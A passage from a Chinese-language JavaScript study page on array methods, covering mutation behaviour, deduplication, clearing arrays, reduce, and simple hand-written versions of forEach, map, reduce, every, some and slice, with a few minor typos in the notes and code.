</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="_7-数组相关"><a href="#_7-数组相关" class="header-anchor">#</a> 7:数组相关</h4> <h5 id="常用方法"><a href="#常用方法" class="header-anchor">#</a> 常用方法</h5> <ul><li><code>push</code>() 可以接收任意数量的参数，把他们逐个添加到数组的末尾，返回修改后数组的长度;【栈方法】</li> <li><code>pop</code>() 从数组末尾移除最后一项，返回移除的项;【栈方法】</li> <li><code>unshift</code>() 向数组前端添加任意个项并返回新数组的长度;【队列方法】</li> <li><code>shift</code>() 移除数组的第一项并返回该项;【队列方法】</li> <li><code>splice</code>(起始位置，删除的个数，[插入的元素]) // <strong>删除|插入|替换数组</strong>，返回删除的元素组成的数组，会修改原数组；</li> <li><code>sort</code>(compare): 排序， compare函数接收两个参数,如果返回负数，则第一个参数位于第二个参数前面；如果返回零，则两个参数相等；如果返回正数，第一个参数位于第二个参数后面; <strong>(a,b) =&gt; (b-a) // 降序，升序相反</strong>；a-b:默认升，b-a：降</li> <li><code>reverse()</code>: 反转数组元素的顺序；</li> <li></li> <li><code>concat</code>(数组 | 一个或多个元素) ；合并数组，返回新数组；</li> <li><code>slice</code>(起始位置 ，[结束位置])；切分数组，返回新数组，新数组不包含结束位置的项；</li> <li><code>Array.join()</code>是Array.split()方法的逆向操作;以指定分隔符连接，如果不指定，<em>默认以,连接</em>;</li> <li><code>Array.toString()</code>: 返回一个字符串，表示指定的数组及其元素。跟join类似;</li></ul> <p>总括：【PPSU RSS】</p> <table><thead><tr><th>方法</th> <th>作用</th> <th>是否影响原数组</th></tr></thead> <tbody><tr><td>push</td> <td>在数组后添加元素，返回数组长度</td> <td>✅</td></tr> <tr><td>pop</td> <td>删除数组最后一项，返回被删除项</td> <td>✅</td></tr> <tr><td>shift</td> <td>删除数组第一项，并返回被删除项</td> <td>✅</td></tr> <tr><td>unshift</td> <td>数组开头添加元素，返回新数组长度</td> <td>✅</td></tr> <tr><td>reserve</td> <td>反转一个数组，返回修改后的数组</td> <td>✅</td></tr> <tr><td>sort</td> <td>排序一个数组，返回修改后的数组</td> <td>✅</td></tr> <tr><td>splice</td> <td>截取数组，返回被截取的区间</td> <td>✅</td></tr> <tr><td>join</td> <td>将一个数组所有元素连接成字符串并返回这个字符串</td> <td>❌</td></tr> <tr><td>concat</td> <td>arr1.concat(arr2, arr3)  连接数组</td> <td>❌</td></tr> <tr><td>join</td> <td>arr.join(x)将arr数组元素连接成字符串并返回这个字符串</td> <td>❌</td></tr> <tr><td>map</td> <td>操作数组每一项并返回一个新数组</td> <td>❌</td></tr> <tr><td>forEach</td> <td>遍历数组，没有返回值</td> <td>❌</td></tr> <tr><td>filter</td> <td>对数组所有项进行判断，返回符合规则的新数组</td> <td>❌</td></tr> <tr><td>every</td> <td>数组每一项都符合规则才返回true</td> <td>❌</td></tr> <tr><td>some</td> <td>数组有符合规则的一项就返回true</td> <td>❌</td></tr> <tr><td>reduce</td> <td>接收上一个return和数组的下一项</td> <td>❌</td></tr> <tr><td>flat</td> <td>数组扁平化</td> <td>❌</td></tr> <tr><td>slice</td> <td>截取数组，返回被截取的区间</td> <td>❌</td></tr></tbody></table> <h5 id="数组去重"><a href="#数组去重" class="header-anchor">#</a> 数组去重</h5> <blockquote><p>去除数组的重复成员</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//方法一：普通遍历筛选法；</span>
<span class="token comment">//方式二：filter及map方法特性；</span>
<span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token operator">!</span>res<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">//方法三：set方法; 解构[...]等同于Array.from()</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">]</span>； <span class="token comment">//Array.from(new Set(array))</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token string">'ababbc'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment">// &quot;abc&quot; //上面的方法也可以用于，去除字符串里面的重复字符。</span>
<span class="token comment">//方式四：lodash方法;</span>
_<span class="token punctuation">.</span><span class="token function">unionBy</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token punctuation">[</span>iteratee<span class="token operator">=</span>_<span class="token punctuation">.</span>identity<span class="token punctuation">]</span><span class="token punctuation">)</span>；  _<span class="token punctuation">.</span><span class="token function">compact</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
rightList <span class="token operator">=</span> _<span class="token punctuation">.</span><span class="token function">unionBy</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>rightList<span class="token punctuation">,</span> <span class="token operator">...</span>rightListN<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'rowId'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h5 id="数组清空"><a href="#数组清空" class="header-anchor">#</a> 数组清空</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//方法一：把变量arrayList设置为一个新的空数组。如果在其他任何地方都没有对原始数组arrayList的引用，则建议这样做，因为它实际上会创建一个新的空数组。</span>
<span class="token comment">//应该小心使用这种清空数组的方法，因为如果你从另一个变量引用了这个数组，那么原始的引用数组将保持不变。</span>
arrayList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token comment">//方法二：通过将其length设置为0来清除现有数组。这种清空数组的方式还会更新指向原始数组的所有引用变量。 </span>
<span class="token comment">//因此，当你想要更新指向arrayList的所有引用变量时，此方法很有用。</span>
arrayList<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token comment">//使用delete命令删除一个数组成员，会形成空位，并且不会影响length属性</span>
<span class="token comment">//数组的空位是可以读取的，返回undefined；比如：var a = [, , ,]; a[1] // undefined</span>

<span class="token comment">//方式三：这种清空数组的方法也将更新对原始数组的所有引用。</span>
arrayList<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arrayList<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//方式四：实现也可以空数组，但通常不建议经常使用这种方式</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>arrayList<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>
  arrayList<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h5 id="归并-递归"><a href="#归并-递归" class="header-anchor">#</a> 归并/递归</h5> <p><strong>reduce/reduceRight</strong>：数组只有一项或是个空数组不做遍历操作; 如果归并的数组为空，则会报错;</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">//函数有四个参数, pre(上一次的返回值),cur(当前值), curIndex(当前值索引), arr(当前数组)</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span>item<span class="token punctuation">,</span>key<span class="token punctuation">,</span>array</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//打印了 两次9</span>
    <span class="token keyword">return</span> prev<span class="token operator">+</span>item<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//6</span>
<span class="token comment">//输出：9 9 6</span>

<span class="token comment">//数组只有一项或是个空数组不做遍历操作; 如果归并的数组为空，则会报错;</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span>item<span class="token punctuation">,</span>key<span class="token punctuation">,</span>array</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//不打印</span>
    <span class="token keyword">return</span> prev<span class="token operator">+</span>item<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
<span class="token comment">//没有打印2，直接输出1，说明reduce的函数压根没执行，直接将原数组返回了</span>
<span class="token comment">//如果这个数组是空的，调用reduce()或reduceRight()后会直接报错，所以在进行上面操作时最好判断下是否为空数组，不为空再做处理。</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>比如：求数组中的最大值； Math.max()是Math对象内置的方法**,参数是字符串**;</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//4</span>
Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//4</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> cur<span class="token punctuation">,</span>curIndex<span class="token punctuation">,</span>arr</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
 <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//4</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h5 id="遍历方法类似原理"><a href="#遍历方法类似原理" class="header-anchor">#</a> 遍历方法类似原理</h5> <p><strong>foreach的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// if (!Array.prototype.forEach) {</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">forEach</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// }</span>
<span class="token punctuation">[</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;c&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> index<span class="token punctuation">,</span> array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token string">&quot;Is in position &quot;</span> <span class="token operator">+</span> index <span class="token operator">+</span> <span class="token string">&quot; out of &quot;</span> <span class="token operator">+</span> <span class="token punctuation">(</span>array<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><blockquote><h4 id="foreach如何跳出循环"><a href="#foreach如何跳出循环" class="header-anchor">#</a> forEach如何跳出循环？</h4></blockquote> <p>forEach是不能通过<code>break</code>或者<code>return</code>来实现跳出循环的，为什么呢？<strong>实现过forEach的同学应该都知道，forEach的的回调函数形成了一个作用域</strong>，在里面使用<code>return</code>并不会跳出，只会被当做<code>continue</code></p> <p><strong>那怎么跳出循环呢？可以利用<code>try catch</code></strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">getItemById</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> item <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">curItem<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>curItem<span class="token punctuation">.</span>id <span class="token operator">==</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        item <span class="token operator">=</span> curItem<span class="token punctuation">;</span>
        <span class="token keyword">throw</span> <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> item<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p><strong>map的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>map<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//**map的实现原理**，浏览器不支持map属性</span>
  <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">map</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fun</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> newArr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//创建空数组: newArr</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//遍历当前数组中每个元素</span>
      <span class="token comment">//如果当前元素不是undefined</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//判断稀疏数组</span>
        <span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用fun传入当前元素值，位置i，当前数组，将结果保存在r中</span>
        newArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>r<span class="token punctuation">;</span> <span class="token comment">//将newArr的i位置赋值为r</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token comment">//(遍历结束)</span>
    <span class="token keyword">return</span> newArr<span class="token punctuation">;</span><span class="token comment">//返回newArr</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p><strong>reduce的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>reduce<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//**reduce的实现原理**，如果浏览器不支持reduce属性</span>
  <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">reduce</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fun<span class="token punctuation">,</span>base</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    base<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>base<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//默认第一项</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        base<span class="token operator">=</span><span class="token function">fun</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> base<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>every的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>every<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//**every的实现原理**，如果浏览器不支持every属性</span>
  <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">every</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fun</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment">//遍历当前数组中每个元素</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">//调用fun,依次传入当前元素值,位置i,当前数组作为参数，将返回值，保存在变量r中</span>
        <span class="token keyword">var</span> r<span class="token operator">=</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token comment">//(遍历结束)</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment">//返回true</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p><strong>some的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>some<span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//**some的实现原理**，如果浏览器不支持some属性</span>
  <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">some</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fun</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!==</span>unefined<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> r<span class="token operator">=</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//要点</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>    
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>slice的类似实现原理</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">slice</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">start<span class="token punctuation">,</span>end</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
      <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
      start <span class="token operator">=</span> start <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">;</span>  
      <span class="token comment">//this指向调用的对象，当用了call后，能够改变this的指向，也就是指向传进来的对象，这是关键  </span>
      end <span class="token operator">=</span> end <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> 
